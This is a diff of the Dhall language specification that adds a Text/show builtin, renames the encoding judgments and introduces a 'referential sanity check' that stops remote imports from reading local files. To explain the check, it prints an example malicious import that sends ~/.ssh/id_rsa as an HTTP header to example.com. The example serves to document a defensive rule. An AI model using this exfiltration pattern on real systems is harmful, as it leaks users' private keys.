@@ -183,10 +183,10 @@ a, b, f, l, r, e, t, u, A, B, E, T, U, c, i, o
   / Natural/even                      ; Test if even
   / Natural/odd                       ; Test if odd
   / Natural/toInteger                 ; Convert Natural to Integer
-  / Natural/show                      ; Convert Natural to Text
+  / Natural/show                      ; Convert Natural to Text representation
   / Integer/toDouble                  ; Convert Integer to Double
-  / Integer/show                      ; Convert Integer to Text
-  / Double/show                       ; Convert Double to Text
+  / Integer/show                      ; Convert Integer to Text representation
+  / Double/show                       ; Convert Double to Text representation
   / List/build                        ; List introduction
   / List/fold                         ; List elimination
   / List/length                       ; Length of list
@@ -196,6 +196,7 @@ a, b, f, l, r, e, t, u, A, B, E, T, U, c, i, o
   / List/reverse                      ; Reverse list
   / Optional/fold                     ; Optional introduction
   / Optional/build                    ; Optional elimination
+  / Text/show                         ; Convert Text to its own representation
   / Bool                              ; Bool type
   / Optional                          ; Optional type
   / Natural                           ; Natural type
@@ -831,6 +832,10 @@ The remaining rules are:
     ↑(d, x, m, Optional/build) = Optional/build
 
 
+    ─────────────────────────────────
+    ↑(d, x, m, Text/show) = Text/show
+
+
     ───────────────────────
     ↑(d, x, m, Bool) = Bool
 
@@ -1381,6 +1386,10 @@ The remaining rules are:
     Optional/build[x@n ≔ e] = Optional/build
 
 
+    ──────────────────────────────
+    Text/show[x@n ≔ e] = Text/show
+
+
     ────────────────────
     Bool[x@n ≔ e] = Bool
 
@@ -1852,6 +1861,10 @@ sub-expressions for the remaining rules:
 
     ───────────────────────────────
     Optional/build ↦ Optional/build
+
+
+    ─────────────────────
+    Text/show ↦ Text/show
 
 
     ───────────
@@ -2432,6 +2445,57 @@ any interpolated expression that normalize to `Text` literals:
     t₀ ⇥ t₁   "ss₀…" ⇥ "ss₁…"
     ─────────────────────────────  ; If no other rule matches
     "s₀${t₀}ss₀…" ⇥ "s₀${t₁}ss₁…"
+
+
+The `Text/show` function replaces a `Text` literal with another `Text` literal
+representing valid Dhall source code for the original literal.  In particular,
+this function both quotes and escapes the original literal so that if you were
+to render the escaped `Text` value the result would appear to be the original
+`Text` input to the function:
+
+    -- Rendering the right-hand side gives the original argument: "abc\ndef"
+    Text/show "abc\ndef" = "\"abc\\ndef\""
+
+Escaping is done in such a way that the rendered result is not only valid
+Dhall source code but also valid JSON when the `Text` does not contain any
+Unicode code points above `\uFFFF`.  This comes in handy if you want to use
+Dhall to generate Dhall code or to generate JSON.
+
+The body of the `Text` literal escapes the following characters according to
+these rules:
+
+* `"`  → `\"`
+* `$`  → `\u0024`
+* `\`  → `\\`
+* `\b` → `\\b`
+* `\f` → `\\f`
+* `\n` → `\\n`
+* `\r` → `\\r`
+* `\t` → `\\t`
+
+Carefully note that `$` is not escaped as `\$` since that is not a valid JSON
+escape sequence.
+
+`Text/show` also escapes any non-printable characters as their Unicode escape
+sequences:
+
+* `\u0000`-`\u001F` → `\\u0000`-`\\u001F`
+
+... since that is the only valid way to represent them within the Dhall grammar.
+
+Or in other words:
+
+
+    f ⇥ Text/show   a ⇥ "…\n…\$…\\…\"…\u0000…"
+    ──────────────────────────────────────────
+    f a ⇥ "\"…\\n…\\u0024…\\\\…\\\"…\\u0000…\""
+
+
+Otherwise, in isolation `Text/show` is in normal form:
+
+
+    ─────────────────────
+    Text/show ⇥ Text/show
 
 
 Use machine concatenation to simplify the "text concatenation" operator if both
@@ -3572,6 +3636,13 @@ The built-in functions on `Natural` numbers have the following types:
     Γ ⊢ t : Text   Γ ⊢ "ss…" : Text
     ───────────────────────────────
     Γ ⊢ "s${t}ss…" : Text
+
+
+The `Text` show function has the following type:
+
+
+    ───────────────────────────
+    Γ ⊢ Text/show : Text → Text
 
 
 The `Text` concatenation operator takes arguments of type `Text` and returns a
@@ -4780,6 +4851,101 @@ To import a URL with quoted path components, percent-encode each quoted
 path component according to
 [RFC 3986 - Section 2](https://tools.ietf.org/html/rfc3986#section-2).
 
+### Referential sanity check
+
+The referential sanity check is used to ensure that a "referentially
+transparent" import can never depend on a "referentially opaque" import.
+
+A remote import such as `https://example.com/foo` is "referentially transparent"
+because the contents of the import does not change depending on which machine
+you import it from (with caveats, such as not tampering with DNS, etc.).
+
+All non-remote imports are "referentially opaque" because their contents depend
+on which machine that you import them from.
+
+Referential transparency is checked using a judgment of the form:
+
+    referentiallySane(parent, child)
+
+... where
+
+* `parent` (an input) is the canonicalized path of the parent import
+* `child` (an input) is the canonicalized path of the child import
+
+There is no output: either the judgment matches or it does not.
+
+The rules for the referential transparency check ensure that a referentially
+transparent parent can never import a referentially opaque child.  In practice
+this means that remote imports can only import other remote imports (after
+both imports have been canonicalized):
+
+
+    ───────────────────────────────────────────────────────────────────────────────────────────
+    referentiallySane(https://authority₀ directory₀ file₀, https://authority₁ directory₁ file₁)
+
+
+... whereas non-remote imports can import anything:
+
+
+    ────────────────────────────────────
+    referentiallySane(path file, import)
+
+
+    ──────────────────────────────────────
+    referentiallySane(. path file, import)
+
+
+    ───────────────────────────────────────
+    referentiallySane(.. path file, import)
+
+
+    ──────────────────────────────────────
+    referentiallySane(~ path file, import)
+
+
+    ────────────────────────────────
+    referentiallySane(env:x, import)
+
+
+This is a security check because it prevents remote imports from exfiltrating
+local paths and environment variables using the language's support for
+custom headers.  For example, this check prevents the following malicious
+import:
+
+
+    {- This file is hosted at `https://example.com/bad` and attempts to steal a
+       sensitive file from the user's system using the language's support for
+       custom headers
+    -}
+    https://example.com/recordHeaders using ./headers
+
+... which in turn tries to import this file:
+
+    {- This file is hosted at `https://example.com/headers` and attempts to
+       read in the contents of the user's private key
+
+       This import would be rejected because its canonical path is:
+
+           https://example.com/headers
+
+       ... whereas the canonical path of the private key is:
+
+           ~/.ssh/id_rsa
+
+       ... and the following `referentiallySane` judgment is not valid:
+
+           referentiallySane(https://example.com/headers, ~/.ssh/id_rsa)
+
+       ... because the referentially transparent remote import is trying to
+       access a referentially opaque local import.
+    -}
+    [ { header = "Private Key", value = ~/.ssh/id_rsa as Text } ]
+
+
+This is also a sanity check because a referentially transparent import cannot
+truly be referentially transparent if it depends on any referentially opaque
+imports.
+
 ### Import resolution judgment
 
 The import resolution phase replaces all imports with the expression located
@@ -4797,7 +4963,8 @@ Import resolution is a function of the following form:
   the state of the filesystem/environment/web before the import
     * `Γ₀(import)` means to retrieve the expression located at `import`
 * `e₀` (an input) is the expression to resolve
-* `here` (an input) is the current import, used to resolve relative imports
+* `here` (an input) is the current import (canonicalized), used to resolve
+   relative imports
 * `e₁` (an output) is the import-free resolved expression
 * `Γ₁` (an output) is an unordered map from imports to expressions representing
   the state of the filesystem/environment/web after the import
@@ -4808,19 +4975,20 @@ then you retrieve the expression from the canonicalized path and transitively
 resolve imports within the retrieved expression:
 
 
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
-    Γ(import₂) = e₀                    ; Retrieve the expression
-    Δ, import₂ × Γ₀ ⊢ e₀ @ import₂ ⇒ e₁ ⊢ Γ₁
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
+    Γ(child) = e₀                        ; Retrieve the expression
+    Δ, child × Γ₀ ⊢ e₀ @ child ⇒ e₁ ⊢ Γ₁
     ε ⊢ e₁ : T
-    ─────────────────────────────────  ; * import₂ ∉ Δ
-    Δ × Γ₀ ⊢ import₀ @ here ⇒ e₁ ⊢ Γ₁  ; * import₀ ≠ missing
+    ───────────────────────────────────  ; * child ∉ Δ
+    Δ × Γ₀ ⊢ import₀ @ parent ⇒ e₁ ⊢ Γ₁  ; * import₀ ≠ missing
 
 
 Carefully note that the fully resolved import must successfully type-check with
 an empty context.  Imported expressions may not contain any free variables.
 
-Also note that the `import₂ ∉ Δ` forbids cyclic imports to prevent
+Also note that the `child ∉ Δ` forbids cyclic imports to prevent
 non-termination from being (trivially) introduced via the import system.  An
 import cycle is an import resolution error.
 
@@ -4828,27 +4996,29 @@ If an import ends with `as Text`, import the raw contents of the file as a
 `Text` value instead of importing the file a Dhall expression:
 
 
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
-    Γ(import₂) = "s"                         ; Read the raw contents of the file
-    ────────────────────────────────────────
-    Δ × Γ ⊢ import₀ as Text @ here ⇒ "s" ⊢ Γ
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
+    Γ(child) = "s"  ; Read the raw contents of the file
+    ──────────────────────────────────────────
+    Δ × Γ ⊢ import₀ as Text @ parent ⇒ "s" ⊢ Γ
 
 
 If an import ends with `using headers`, resolve the `headers` import and use
 the resolved expression as additional headers supplied to the HTTP request:
 
 
-    Δ × Γ₀ ⊢ headers @ here ⇒ h₀ ⊢ Γ₁
+    Δ × Γ₀ ⊢ headers @ parent ⇒ h₀ ⊢ Γ₁
     ε ⊢ h₀ : List { header : Text, value : Text }
     h₀ ⇥ h₁
-    here </> import₀ = import₁
-    canonicalize(import₁) = import₂
+    parent </> import₀ = import₁
+    canonicalize(import₁) = child
+    referentiallySane(parent, child)
     Γ₁(https://authority directory file) = e₀  ; Use h₁ for custom headers here
-    Δ, import₂ × Γ₁ ⊢ e₀ @ import₂ ⇒ e₁ ⊢ Γ₂
+    Δ, child × Γ₁ ⊢ e₀ @ child ⇒ e₁ ⊢ Γ₂
     ε ⊢ e₁ : T
-    ────────────────────────────────────────────────────────────────────────  ; * import₂ ∉ Δ
-    Δ × Γ₀ ⊢ https://authority directory file @ here using headers ⇒ e₁ ⊢ Γ₂  ; * import₀ ≠ missing
+    ──────────────────────────────────────────────────────────────────────────  ; * child ∉ Δ
+    Δ × Γ₀ ⊢ https://authority directory file @ parent using headers ⇒ e₁ ⊢ Γ₂  ; * import₀ ≠ missing
 
 
 For example, if `h₁` in the above judgment normalized to:
@@ -4892,8 +5062,8 @@ expression protected by a semantic integrity check:
   `"${XDG_CACHE_HOME}/dhall/${base16Hash}"` or
   `"${HOME}/.cache/dhall/${base16Hash}"`
 * If the file exists and is readable, verify the file's byte contents match the
-  hash and then decode the expression from the bytes using the
-  `decodeWithVersion` judgment instead of importing the expression
+  hash and then decode the expression from the bytes using the `decode` judgment
+  instead of importing the expression
 * Otherwise, import the expression as normal
 
 An implementation MUST fail and alert the user if hash verification fails,
@@ -4906,7 +5076,7 @@ Or in judgment form:
     Γ("${XDG_CACHE_HOME}/dhall/${base16Hash}") = binary
     sha256(binary) = byteHash
     base16Encode(byteHash) = base16Hash                  ; Verify the hash
-    decodeWithVersion(binary) = e
+    decode(binary) = e
     ───────────────────────────────────────────────────  ; Import is already cached under `$XDG_CACHE_HOME`
     Δ × Γ ⊢ import₀ sha256:base16Hash @ here ⇒ e ⊢ Γ
 
@@ -4914,7 +5084,7 @@ Or in judgment form:
     Γ("${HOME}/.cache/dhall/${base16Hash}") = binary
     sha256(binary) = byteHash
     base16Encode(byteHash) = base16Hash                  ; Verify the hash
-    decodeWithVersion(binary) = e
+    decode(binary) = e
     ───────────────────────────────────────────────────  ; Otherwise, import is cached under `$HOME`
     Δ × Γ ⊢ import₀ sha256:base16Hash @ here ⇒ e ⊢ Γ
 
@@ -4923,7 +5093,7 @@ Or in judgment form:
     ε ⊢ e₁ : T
     e₁ ⇥ e₂
     e₂ ↦ e₃
-    encode-1.0(e₃) = binary
+    encode(e₃) = binary
     sha256(binary) = byteHash
     base16Encode(byteHash) = base16Hash  ; Verify the hash
     ─────────────────────────────────────────────────────────────────────────────────────────────────────  ; Import is not cached, try to save under `$XDG_CACHE_HOME`
@@ -4934,7 +5104,7 @@ Or in judgment form:
     ε ⊢ e₁ : T
     e₁ ⇥ e₂
     e₂ ↦ e₃
-    encode-1.0(e₃) = binary
+    encode(e₃) = binary
     sha256(binary) = byteHash
     base16Encode(byteHash) = base16Hash  ; Verify the hash
     ──────────────────────────────────────────────────────────────────────────────────────────────────  ; Otherwise, try `HOME`
@@ -4945,7 +5115,7 @@ Or in judgment form:
     ε ⊢ e₁ : T
     e₁ ⇥ e₂
     e₂ ↦ e₃
-    encode-1.0(e₃) = binary
+    encode(e₃) = binary
     sha256(binary) = byteHash
     base16Encode(byteHash) = base16Hash                 ; Verify the hash
     ─────────────────────────────────────────────────── ; Otherwise, don't cache
